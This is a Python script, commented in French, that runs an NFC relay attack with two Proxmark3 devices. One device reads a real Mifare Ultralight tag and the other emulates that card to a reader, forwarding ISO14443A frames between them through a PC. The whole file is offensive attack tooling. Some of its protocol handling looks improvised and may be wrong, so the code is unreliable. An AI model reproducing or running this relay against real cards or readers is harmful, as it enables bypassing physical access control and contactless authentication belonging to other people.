#!/usr/bin/env python3
"""
NFC Relay Attack - Proxmark3 dual device
Architecture: Tag <-> Mole(ACM1) <-> PC <-> Proxy(ACM0) <-> Reader

Mole (ttyACM1) : côté TAG - sniff/répond au lecteur (notre téléphone) ... non,
Mole (ttyACM1) : côté TAG réel - communique avec le vrai tag Ultralight
Proxy(ttyACM0) : côté LECTEUR - émule une carte NFC vers le téléphone/lecteur

Flow:
  1. Proxy attend une requête du lecteur (téléphone)
  2. On transmet la requête au Mole
  3. Le Mole la forwarde au vrai tag
  4. Le tag répond au Mole
  5. On récupère la réponse et on la renvoie au Proxy
  6. Le Proxy la transmet au lecteur
"""

import serial
import struct
import time
import threading
import sys

# ── Constantes protocole PM3 ──────────────────────────────────────────────────
COMMANDNG_PREAMBLE_MAGIC  = 0x61334d50  # "PM3a"
COMMANDNG_POSTAMBLE_MAGIC = 0x3361
RESPONSENG_PREAMBLE_MAGIC = 0x62334d50  # "PM3b"

# Commandes
CMD_PING                        = 0x0109
CMD_HF_ISO14443A_READER         = 0x0385  # Envoyer APDU/commande ISO14443A
CMD_HF_ISO14443A_SNIFF          = 0x0380
CMD_HF_ISO14443A_SIM            = 0x0381  # Simuler une carte ISO14443A
CMD_HF_MIFARE_SIMULATE          = 0x0600

# Réponses / notifications asynchrones
CMD_HF_ISO14443A_READER_RESP    = 0x0385
CMD_ACK                         = 0x00FF

# Flags pour CMD_HF_ISO14443A_READER
ISO14443A_CMD_RAW               = 0x01
ISO14443A_CMD_INIT              = 0x02
ISO14443A_CMD_NO_SELECT         = 0x04
ISO14443A_CMD_TOPAZMODE         = 0x08
ISO14443A_CMD_NO_DISCONNECT     = 0x10  # garder le champ actif

# Timeout par défaut (secondes)
DEFAULT_TIMEOUT = 2.0
RELAY_TIMEOUT   = 1.0  # plus court en relai pour la latence

# ── Bas niveau PM3 ────────────────────────────────────────────────────────────

def send_ng(ser, cmd, data=b'', label=''):
    length_ng = (len(data) & 0x7FFF) | (1 << 15)
    preamble  = struct.pack('<IHH', COMMANDNG_PREAMBLE_MAGIC, length_ng, cmd)
    postamble = struct.pack('<H', COMMANDNG_POSTAMBLE_MAGIC)
    packet = preamble + data + postamble
    if label:
        print(f"[{label}] >> cmd=0x{cmd:04X} len={len(data)} data={data.hex()}")
    ser.write(packet)
    ser.flush()


def read_ng(ser, timeout=DEFAULT_TIMEOUT, label=''):
    """Lire une réponse NG. Retourne dict ou None."""
    deadline = time.time() + timeout
    raw = b''
    while len(raw) < 10:
        if time.time() > deadline:
            if label:
                print(f"[{label}] << TIMEOUT preamble ({len(raw)}/10 bytes)")
            return None
        chunk = ser.read(10 - len(raw))
        raw += chunk

    magic, length_ng, cmd, status, reason = struct.unpack('<IHHBB', raw)
    length = length_ng & 0x7FFF

    if magic != RESPONSENG_PREAMBLE_MAGIC:
        if label:
            print(f"[{label}] << BAD MAGIC 0x{magic:08X}")
        # flush et retour None
        ser.reset_input_buffer()
        return None

    data = b''
    if length > 0:
        d = time.time() + 2.0
        while len(data) < length and time.time() < d:
            data += ser.read(length - len(data))

    postamble = ser.read(2)
    crc = struct.unpack('<H', postamble)[0] if len(postamble) == 2 else 0

    if label:
        print(f"[{label}] << cmd=0x{cmd:04X} status={status} len={length} data={data.hex()}")

    return {'cmd': cmd, 'status': status, 'reason': reason, 'data': data, 'crc': crc}


def ping(ser, label=''):
    """Teste la connexion."""
    ping_data = bytes(range(32))
    send_ng(ser, CMD_PING, ping_data, label)
    resp = read_ng(ser, timeout=3.0, label=label)
    if resp and resp['data'] == ping_data:
        print(f"[{label}] PING OK ✓")
        return True
    print(f"[{label}] PING FAILED ✗")
    return False

# ── Commandes haut niveau ─────────────────────────────────────────────────────

def iso14443a_raw(ser, data_bytes, flags=0, label=''):
    """
    Envoyer une commande ISO14443A brute et récupérer la réponse.
    data_bytes : bytes de la commande (ex: REQA = b'\\x26', READ = b'\\x30\\x00', etc.)
    flags      : combinaison ISO14443A_CMD_*
    """
    # Payload : flags(1) + len(2) + data
    payload = struct.pack('<BH', flags, len(data_bytes)) + data_bytes
    send_ng(ser, CMD_HF_ISO14443A_READER, payload, label)
    resp = read_ng(ser, timeout=RELAY_TIMEOUT, label=label)
    return resp


def init_field(ser, label=''):
    """Active le champ RF et fait un anticollision/select sur le tag."""
    # REQA
    resp = iso14443a_raw(ser, b'\x26',
                         flags=ISO14443A_CMD_INIT | ISO14443A_CMD_NO_DISCONNECT,
                         label=label)
    return resp


def send_to_tag(ser, cmd_bytes, label=''):
    """
    Envoyer une commande au tag (via mole) sans déconnecter.
    Le champ doit déjà être actif.
    """
    resp = iso14443a_raw(ser, cmd_bytes,
                         flags=ISO14443A_CMD_NO_DISCONNECT,
                         label=label)
    return resp

# ── Relay core ────────────────────────────────────────────────────────────────

class RelayBridge:
    """
    Pont de relai entre le mole (tag side) et le proxy (reader side).

    Stratégie simple et rapide :
      - Le proxy est en mode simulation (CMD_HF_ISO14443A_SIM)
      - Quand le lecteur envoie quelque chose, le proxy nous le remonte via réponse asynchrone
      - On forward au mole, on lit la réponse du tag, on la renvoie au proxy

    Note: PM3 en mode sim envoie des CMD_HF_ISO14443A_READER_RESP (ou similaire)
    avec les données reçues du lecteur, et attend une commande de réponse.

    Pour Mifare Ultralight, on utilise le mode "standalone relay" :
    les deux PM3 sont en mode reader raw et on orchestre depuis le PC.
    """

    def __init__(self, mole_port='/dev/ttyACM1', proxy_port='/dev/ttyACM0',
                 baudrate=115200, verbose=True):
        self.verbose = verbose
        print(f"Ouverture Mole  : {mole_port}")
        self.mole  = serial.Serial(mole_port,  baudrate=baudrate, timeout=0.1)
        print(f"Ouverture Proxy : {proxy_port}")
        self.proxy = serial.Serial(proxy_port, baudrate=baudrate, timeout=0.1)
        time.sleep(0.3)
        self.mole.reset_input_buffer()
        self.mole.reset_output_buffer()
        self.proxy.reset_input_buffer()
        self.proxy.reset_output_buffer()

    def close(self):
        self.mole.close()
        self.proxy.close()

    def check_connections(self):
        print("\n=== Vérification des connexions ===")
        ok_mole  = ping(self.mole,  label='MOLE ')
        ok_proxy = ping(self.proxy, label='PROXY')
        return ok_mole and ok_proxy

    # ── Mode relay "reader-reader" ──────────────────────────────────────────
    # Les deux PM3 sont en mode reader.
    # Le PROXY interroge activement le lecteur (téléphone en mode card emulation
    # ou on l'utilise en mode "sniff + inject").
    #
    # Pour un relai tag <-> lecteur avec Ultralight :
    #   PROXY : reçoit les commandes du lecteur via sniff ou sim
    #   MOLE  : envoie ces commandes au vrai tag et récupère les réponses
    #
    # Implémentation pratique avec deux PM3 en mode reader-raw :
    #   - MOLE  : reader, connecté au vrai tag
    #   - PROXY : simulateur de carte (répond au lecteur)
    #   - Le PC orchestre : récupère ce que le lecteur veut, forward au tag, retourne la réponse

    def relay_loop_reader_reader(self):
        """
        Boucle de relai en mode reader-reader.

        Le proxy écoute le lecteur (sniff passif ou requête active).
        Dès qu'une trame arrive, elle est forwardée au mole -> tag -> réponse -> proxy -> lecteur.

        Pour démarrer :
          - PROXY en mode sniff : capte les trames du lecteur
          - MOLE  en mode reader actif sur le tag

        Note : cette approche nécessite que le lecteur (téléphone) soit en mode
        reader NFC et que le proxy soit en mode card emulation pour lui répondre.
        """
        print("\n=== RELAY LOOP (reader-reader mode) ===")
        print("Initialisation champ sur le TAG via MOLE...")

        # Activer le champ et sélectionner le tag
        resp = init_field(self.mole, label='MOLE')
        if not resp:
            print("[ERREUR] Impossible d'initialiser le champ sur le tag !")
            return
        print(f"[MOLE] Tag détecté, ATQA/UID reçu: {resp['data'].hex()}")

        print("\nDémarrage de la boucle de relai.")
        print("Le PROXY écoute le lecteur (téléphone)...")
        print("Ctrl+C pour arrêter.\n")

        iteration = 0
        try:
            while True:
                iteration += 1
                # 1. Lire une commande du lecteur via le proxy (mode sniff/sim)
                #    On utilise read_ng avec timeout court pour être non-bloquant
                reader_frame = self._read_reader_frame()
                if reader_frame is None:
                    continue  # rien reçu, on reboucle

                if self.verbose:
                    print(f"\n[iter {iteration}] Lecteur -> Proxy: {reader_frame.hex()}")

                # 2. Forwarder au mole (tag)
                tag_resp = send_to_tag(self.mole, reader_frame, label='MOLE')
                if tag_resp is None:
                    print(f"[MOLE] Pas de réponse du tag pour: {reader_frame.hex()}")
                    tag_response_bytes = b''
                else:
                    tag_response_bytes = tag_resp['data']
                    if self.verbose:
                        print(f"[iter {iteration}] Tag -> Mole: {tag_response_bytes.hex()}")

                # 3. Renvoyer la réponse du tag au lecteur via le proxy
                self._send_response_to_reader(tag_response_bytes)
                if self.verbose:
                    print(f"[iter {iteration}] Proxy -> Lecteur: {tag_response_bytes.hex()}")

        except KeyboardInterrupt:
            print("\n[RELAY] Arrêt par l'utilisateur.")

    def _read_reader_frame(self):
        """
        Lire une trame envoyée par le lecteur (reçue par le proxy en mode sim).
        Retourne bytes ou None.
        """
        resp = read_ng(self.proxy, timeout=0.05)  # timeout très court
        if resp is None:
            return None
        # Les trames du lecteur arrivent typiquement en CMD_HF_ISO14443A_SIM
        # ou comme données dans la réponse
        if len(resp['data']) > 0:
            return resp['data']
        return None

    def _send_response_to_reader(self, data):
        """
        Envoyer une réponse au lecteur via le proxy (en mode sim).
        """
        # En mode simulation, on envoie la réponse avec CMD_HF_ISO14443A_READER
        payload = struct.pack('<BH', ISO14443A_CMD_NO_DISCONNECT, len(data)) + data
        send_ng(self.proxy, CMD_HF_ISO14443A_READER, payload)

    # ── Mode relay "sniff + inject" (plus robuste) ─────────────────────────
    def relay_loop_full(self):
        """
        Boucle de relai complète avec gestion de l'anticollision.

        Protocole :
          PROXY (ACM0) : en mode simulation Ultralight, répond au lecteur
          MOLE  (ACM1) : en mode reader, interroge le vrai tag

        Le PROXY capture chaque commande du lecteur et nous la remonte.
        On la forward au MOLE qui la transmet au tag.
        La réponse du tag remonte au MOLE, on la renvoie au PROXY.
        Le PROXY répond au lecteur.

        C'est le mode "ghost" / relay classique.
        """
        print("\n=== RELAY FULL MODE ===")
        print("Initialisation...")

        # 1. Init tag via mole
        print("[MOLE] Activation champ RF + anticollision...")
        resp = init_field(self.mole, label='MOLE')
        if not resp:
            print("[ERREUR] Tag non détecté sur le Mole !")
            return

        uid_and_atqa = resp['data']
        print(f"[MOLE] Tag OK - données: {uid_and_atqa.hex()}")

        # 2. Démarrer la simulation sur le proxy
        #    On simule un Ultralight avec l'UID du vrai tag
        # L'UID Ultralight est généralement 7 bytes dans les données de sélection
        # Pour l'instant on démarre la sim en mode générique
        print("[PROXY] Démarrage simulation Ultralight...")
        # CMD_HF_ISO14443A_SIM avec type=2 (Ultralight), UID=0 (auto)
        sim_payload = struct.pack('<BB', 2, 0)  # type=MIFARE_UL, flags=0
        send_ng(self.proxy, CMD_HF_ISO14443A_SIM, sim_payload, label='PROXY')

        print("\n[RELAY] En attente du lecteur... (Ctrl+C pour arrêter)\n")

        try:
            while True:
                # Lire les trames capturées par le proxy
                resp = read_ng(self.proxy, timeout=0.02)
                if resp is None:
                    continue

                if resp['cmd'] == CMD_HF_ISO14443A_SIM:
                    # Trame du lecteur reçue par le proxy
                    reader_cmd = resp['data']
                    if not reader_cmd:
                        continue

                    print(f"[PROXY] Reçu du lecteur: {reader_cmd.hex()}")

                    # Forward au mole -> tag
                    tag_resp = send_to_tag(self.mole, reader_cmd, label='MOLE')
                    if tag_resp:
                        tag_data = tag_resp['data']
                        print(f"[MOLE]  Réponse tag: {tag_data.hex()}")
                        # Renvoyer au proxy (qui répond au lecteur)
                        self._send_response_to_reader(tag_data)
                    else:
                        print(f"[MOLE]  Pas de réponse du tag")

        except KeyboardInterrupt:
            print("\n[RELAY] Arrêt.")

# ── Point d'entrée ────────────────────────────────────────────────────────────

def main():
    MOLE_PORT  = '/dev/ttyACM1'  # côté TAG
    PROXY_PORT = '/dev/ttyACM0'  # côté LECTEUR

    print("=" * 60)
    print("  NFC RELAY ATTACK - Proxmark3 x2")
    print(f"  Mole  (tag side)    : {MOLE_PORT}")
    print(f"  Proxy (reader side) : {PROXY_PORT}")
    print("=" * 60)

    bridge = RelayBridge(MOLE_PORT, PROXY_PORT, verbose=True)

    try:
        if not bridge.check_connections():
            print("\n[ERREUR] Au moins un Proxmark3 ne répond pas. Vérifier les connexions.")
            sys.exit(1)

        print("\nChoisir le mode de relai :")
        print("  1. reader-reader (simple, pour tests)")
        print("  2. full relay (sim + reader, recommandé)")
        choice = input("Choix [1/2] : ").strip()

        if choice == '1':
            bridge.relay_loop_reader_reader()
        else:
            bridge.relay_loop_full()

    finally:
        bridge.close()
        print("Ports fermés.")


if __name__ == '__main__':
    main()